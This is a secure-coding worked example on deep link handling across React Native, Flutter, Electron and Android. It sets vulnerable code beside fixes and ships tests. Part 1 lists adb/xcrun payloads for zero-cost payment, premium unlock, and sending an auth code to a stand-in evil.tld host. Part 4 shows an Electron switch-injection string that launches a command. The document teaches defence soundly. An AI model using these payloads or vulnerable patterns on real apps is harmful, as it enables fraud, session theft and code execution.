# Worked Example — Deep Link Handling: Vulnerable vs. Remediated

**Module:** [04 — Deep Link Verification](../modules/04-deep-link-verification.md)
**Scenario:** An application that opens a specific order from an email link, handles an OAuth
callback, and shows a promotional page. The user asked the assistant to "make links from our emails
open the right screen in the app."

---

## Part 1 — The vulnerable implementation (React Native)

```ts
// ✗ VULNERABLE
import * as Linking from 'expo-linking';

function useDeepLinks(navigation) {
  useEffect(() => {
    const sub = Linking.addEventListener('url', ({ url }) => {
      const { path, queryParams } = Linking.parse(url);
      navigation.navigate(path, queryParams);          // ✗ arbitrary route, arbitrary params
    });
    Linking.getInitialURL().then((url) => {
      if (url) {
        const { path, queryParams } = Linking.parse(url);
        navigation.navigate(path, queryParams);        // ✗ same flaw on cold start
      }
    });
    return () => sub.remove();
  }, []);
}
```

```tsx
// ✗ VULNERABLE — screens trust their props because "they came from inside the app"
function OrderScreen({ route }) {
  const { orderId, total } = route.params;             // ✗ attacker-supplied
  return <PayButton orderId={orderId} amount={total} />;   // ✗ amount from the URL
}

function SettingsScreen({ route }) {
  const { isPremium } = route.params;                  // ✗ entitlement from the URL
  return isPremium ? <PremiumPanel /> : <UpsellPanel />;
}

function PromoScreen({ route }) {
  return <WebView source={{ uri: route.params.url }} />;   // ✗ attacker page in app chrome
}

function AuthCallback({ route }) {
  const { token, returnTo } = route.params;
  saveSession(token);                                  // ✗ session established from a URL
  Linking.openURL(returnTo);                           // ✗ open redirect
}
```

### Exploitation

Every payload below is a link an attacker can put in an SMS, an email, a QR code, a web page, or a
malicious app installed on the same device.

```bash
# Pay someone else's order — for nothing
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://order-detail?orderId=8842&total=0" com.example.app
```

```bash
# Unlock paid features
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://settings?isPremium=true" com.example.app
```

```bash
# Render an attacker page inside the trusted app chrome, with the app session
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://promo?url=https://evil.tld/harvest" com.example.app
```

```bash
# Establish a session from a URL, then redirect the authorization code out
xcrun simctl openurl booted "myapp://auth-callback?token=ATTACKER&returnTo=https://evil.tld/steal"
```

Because `path` becomes the route name, the attacker also reaches every screen in the app —
including ones only ever hidden from the navigation menu:

```bash
adb shell am start -a android.intent.action.VIEW -d "myapp://AdminPanel" com.example.app
```

**Note:** switching from `myapp://` to a verified `https://links.example.com/...` App Link changes
nothing here. Verification proves the *domain* is yours; it says nothing about who typed the query
string.

---

## Part 2 — The remediated implementation

### `deepLinkResolver.ts` — the only code in the app that reads a URL

```ts
// ✓ REMEDIATED
import { z } from 'zod';

const ALLOWED_HOSTS = new Set(['links.example.com']);

// Closed allowlist. A route that is not in this map does not exist as a link target.
const ROUTES = {
  'order-detail': z.object({ orderId: z.string().uuid() }),
  'product':      z.object({ sku: z.string().regex(/^[A-Z0-9-]{4,24}$/) }),
  'campaign':     z.object({ id: z.enum(['spring', 'summer', 'winter']) }),
  'settings':     z.object({}).strict(),        // no parameters accepted at all
} as const;

// Redirect destinations resolve through a map keyed by identifier — never a URL.
const DESTINATIONS = new Map([
  ['support', 'https://support.example.com'],
  ['terms',   'https://example.com/terms'],
]);

export type InternalCommand = { route: keyof typeof ROUTES; params: Record<string, unknown> };

export function resolveDeepLink(raw: string): InternalCommand | null {
  let url: URL;
  try { url = new URL(raw); } catch { return null; }          // unparseable -> reject

  if (url.protocol !== 'https:') return null;                  // no custom scheme for anything
  if (!ALLOWED_HOSTS.has(url.hostname)) return null;           // EXACT equality, not startsWith
  if (url.username || url.password) return null;               // reject https://links.example.com@evil.tld

  const key = url.pathname.split('/').filter(Boolean)[0];
  if (!key || !Object.prototype.hasOwnProperty.call(ROUTES, key)) return null;  // no __proto__ route

  const schema = ROUTES[key as keyof typeof ROUTES];
  const parsed = schema.safeParse(Object.fromEntries(url.searchParams));
  if (!parsed.success) return null;                            // reject — never repair

  return { route: key as keyof typeof ROUTES, params: parsed.data };
}

export function resolveDestination(id: string): string | null {
  return DESTINATIONS.get(id) ?? null;
}
```

### `useDeepLinks.ts` — one entry point, cold start and warm start

```ts
// ✓ REMEDIATED
function useDeepLinks(navigation) {
  const handle = useCallback((raw: string | null) => {
    if (!raw) return;
    const cmd = resolveDeepLink(raw);
    if (!cmd) { navigation.navigate('Home'); return; }   // one generic fallback
    navigation.navigate(cmd.route, cmd.params);           // typed, from the closed map
  }, [navigation]);

  useEffect(() => {
    const sub = Linking.addEventListener('url', ({ url }) => handle(url));
    Linking.getInitialURL().then(handle);                 // same validator on both paths
    return () => sub.remove();
  }, [handle]);
}
```

### Screens — remediated

```tsx
// ✓ REMEDIATED — the screen fetches its own data with the SESSION identity.
function OrderScreen({ route }) {
  const { orderId } = route.params;                     // validated uuid, nothing else
  const { data: order, error } = useQuery(['order', orderId], () => api.getOrder(orderId));
  // The server returns 404 for an order this session does not own.
  if (error) return <NotFound />;
  if (!order) return <Loading />;

  // ✓ The amount comes from the server. It was never in the URL.
  return <PayButton orderId={order.id} amount={order.totalCents} currency={order.currency} />;
}

function SettingsScreen() {
  // ✓ Entitlement from the server, per session. No parameter can flip it.
  const { data: me } = useQuery(['me'], api.getMe);
  return me?.premium ? <PremiumPanel /> : <UpsellPanel />;
}

function CampaignScreen({ route }) {
  // ✓ No WebView takes a URL. The campaign id selects a known local screen or asset.
  return <CampaignContent id={route.params.id} />;
}
```

### OAuth callback — remediated

```ts
// ✓ REMEDIATED
import * as AuthSession from 'expo-auth-session';

const discovery = { authorizationEndpoint: '...', tokenEndpoint: '...' };

export function useLogin() {
  const [request, response, promptAsync] = AuthSession.useAuthRequest({
    clientId: PUBLIC_CLIENT_ID,          // ✓ public client id — no secret on the device
    redirectUri: AuthSession.makeRedirectUri({ scheme: 'myapp' }),
    scopes: ['openid', 'profile'],
    usePKCE: true,                       // ✓ S256 challenge — mandatory
  }, discovery);
  // The library runs the flow in ASWebAuthenticationSession / Chrome Custom Tabs,
  // NOT an embedded WebView, and verifies `state` on return.

  useEffect(() => {
    if (response?.type !== 'success') return;
    // ✓ The code is exchanged with the PKCE verifier. No token ever arrives in a URL
    //   parameter, and no session is established from link data.
    exchangeCodeForSession(response.params.code, request!.codeVerifier!);
  }, [response]);

  return promptAsync;
}
```

Never `saveSession(params.token)`. Never `Linking.openURL(params.returnTo)` — if a post-login
destination is needed, send `?to=support` and resolve it through `resolveDestination`.

---

## Part 3 — Flutter

```dart
// ✗ VULNERABLE
_sub = uriLinkStream.listen((Uri? uri) {
  if (uri == null) return;
  Navigator.pushNamed(context, uri.path, arguments: uri.queryParameters);  // ✗
});
```

```dart
// ✓ REMEDIATED
const _allowedHosts = {'links.example.com'};

InternalCommand? resolveDeepLink(Uri uri) {
  if (uri.scheme != 'https') return null;
  if (!_allowedHosts.contains(uri.host)) return null;
  if (uri.userInfo.isNotEmpty) return null;

  final key = uri.pathSegments.isEmpty ? null : uri.pathSegments.first;
  switch (key) {
    case 'order-detail':
      final id = uri.queryParameters['orderId'];
      if (id == null || !_uuid.hasMatch(id)) return null;     // typed, bounded
      return InternalCommand('order-detail', {'orderId': id});
    case 'campaign':
      final id = uri.queryParameters['id'];
      if (!const {'spring', 'summer', 'winter'}.contains(id)) return null;
      return InternalCommand('campaign', {'id': id});
    default:
      return null;                                            // closed set
  }
}

_sub = uriLinkStream.listen((Uri? uri) {
  final cmd = uri == null ? null : resolveDeepLink(uri);
  if (cmd == null) { Navigator.pushNamedAndRemoveUntil(context, '/home', (_) => false); return; }
  Navigator.pushNamed(context, '/${cmd.route}', arguments: cmd.params);
});
```

---

## Part 4 — Desktop (Electron): `argv` is hostile

```js
// ✗ VULNERABLE — a web page that triggers the protocol controls this argv
app.on('second-instance', (_e, argv) => {
  mainWindow.loadURL(argv[argv.length - 1]);      // ✗ loads an attacker URL into the app window
});
```

An attacker page triggering `myapp://` can append Chromium and Node switches, which land in the
**trusted main process**:

```
myapp://x --gpu-launcher="cmd /c calc" --inspect=0.0.0.0:9229 --no-sandbox
```

```js
// ✓ REMEDIATED
const { app } = require('electron');

function handleProtocolUrl(raw) {
  const cmd = resolveDeepLink(raw);        // the SAME resolver as the renderer routes use
  if (cmd) routeInternally(cmd);           // never loadURL, never openExternal, never execFile
}

app.on('second-instance', (_event, argv) => {          // Windows / Linux
  const candidate = argv.find((a) => !a.startsWith('-') && a.startsWith('myapp://'));
  if (candidate) handleProtocolUrl(candidate);          // ✓ every switch dropped first
});

app.on('open-url', (event, url) => {                   // macOS
  event.preventDefault();
  handleProtocolUrl(url);                               // ✓ identical validation
});
```

Both delivery paths need the same validator. A validator on only one of them is a validator on
neither.

---

## Part 5 — Android manifest hygiene

```xml
<!-- ✓ REMEDIATED -->
<activity
    android:name=".MainActivity"
    android:exported="true"
    android:launchMode="singleTop"
    android:taskAffinity="">                      <!-- ✓ blocks task hijacking -->
  <intent-filter android:autoVerify="true">       <!-- ✓ verified App Link -->
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="https" android:host="links.example.com" />
  </intent-filter>
</activity>

<activity android:name=".AdminActivity" android:exported="false" />  <!-- ✓ explicit -->
```

```kotlin
// ✓ Warm start goes through the same validation as cold start — this is the common regression.
override fun onNewIntent(intent: Intent) {
    super.onNewIntent(intent)
    handleDeepLink(intent.data)      // same resolver as onCreate
}
```

---

## Part 6 — What changed, and why each change matters

| # | Vulnerable | Remediated | What it stops |
|---|---|---|---|
| 1 | `navigate(path, queryParams)` | Closed `ROUTES` map | Reaching every screen, including hidden ones |
| 2 | Untyped parameters | `zod` schema per route, uuid/enum/regex | Type confusion, traversal, oversized input |
| 3 | Coerce and continue | Reject to one generic destination | Partial application of a hostile link |
| 4 | `total` from the URL | Amount fetched from the server | Paying zero for someone else's order |
| 5 | `isPremium` from the URL | Entitlement read per session | Free unlock of paid functionality |
| 6 | `orderId` rendered directly | Screen fetches with session identity; server 404s | IDOR across accounts |
| 7 | `WebView({uri: params.url})` | Local content selected by id | Attacker page inside the trusted app chrome |
| 8 | `saveSession(params.token)` | PKCE code exchange | Session established by a link |
| 9 | `openURL(params.returnTo)` | `DESTINATIONS` map | Open redirect carrying the auth code out |
| 10 | Host check absent or `startsWith` | Exact `hostname` equality + reject `user:pass@` | `example.com.evil.tld`, `@evil.tld` bypasses |
| 11 | Custom scheme for auth | Verified App Link + PKCE | Scheme hijacking by another installed app |
| 12 | Embedded WebView login | `ASWebAuthenticationSession` / Custom Tabs | Host app reading typed credentials |
| 13 | `loadURL(argv[last])` | Filter `-` switches, same resolver | Chromium/Node switch injection into main |
| 14 | Cold start only | `onNewIntent` + `getInitialURL` too | Warm-start path skipping validation |
| 15 | Implicit `exported` | Explicit on every component | Externally launchable internal activities |

Rows 4–8 are the ones that convert this from an annoyance into a breach. The rule they all follow
is the same: **a link may navigate; it may never authorize or mutate.**

---

## Part 7 — Verify the fix

```bash
semgrep --config skills/semgrep-rules.yml .
```

```bash
node scripts/audit-native.mjs .
```

**Fire the Part 1 payloads again.** Each must land on a rejection or on a screen showing
server-supplied values:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "https://links.example.com/order-detail?orderId=8842&total=0" com.example.app
```

```bash
adb shell am start -W -a android.intent.action.VIEW -d "https://links.example.com/settings?isPremium=true" com.example.app
```

```bash
xcrun simctl openurl booted "https://links.example.com/campaign?id=../../admin"
```

**Confirm link ownership is actually configured:**

```bash
curl -s https://links.example.com/.well-known/assetlinks.json | head -40
```

**Negative tests to ship with the change:**

```ts
describe('resolveDeepLink', () => {
  const reject = [
    'myapp://order-detail?orderId=1',                                  // custom scheme
    'https://evil.tld/order-detail?orderId=<uuid>',                    // wrong host
    'https://links.example.com.evil.tld/order-detail?orderId=<uuid>',  // suffix trick
    'https://links.example.com@evil.tld/order-detail?orderId=<uuid>',  // userinfo trick
    'https://links.example.com/admin',                                 // route not in map
    'https://links.example.com/__proto__',                             // prototype key
    'https://links.example.com/order-detail?orderId=1',                // not a uuid
    'https://links.example.com/order-detail?orderId=<uuid>&isAdmin=true', // extra field
    'https://links.example.com/campaign?id=../../etc/passwd',          // traversal
  ];
  test.each(reject)('rejects %s', (u) => expect(resolveDeepLink(u)).toBeNull());

  test('accepts a well-formed link', () => {
    const r = resolveDeepLink('https://links.example.com/order-detail?orderId=0f8e...-uuid');
    expect(r).toEqual({ route: 'order-detail', params: { orderId: '0f8e...-uuid' } });
  });
});

test('order screen shows the server amount, not the URL amount', async () => {
  const screen = renderOrder({ orderId: myOrderId });
  await screen.findByText('$42.00');            // server value
  expect(screen.queryByText('$0.00')).toBeNull();
});

test('another account order returns not-found', async () => {
  expect((await api.getOrder(otherUsersOrderId)).status).toBe(404);
});
```
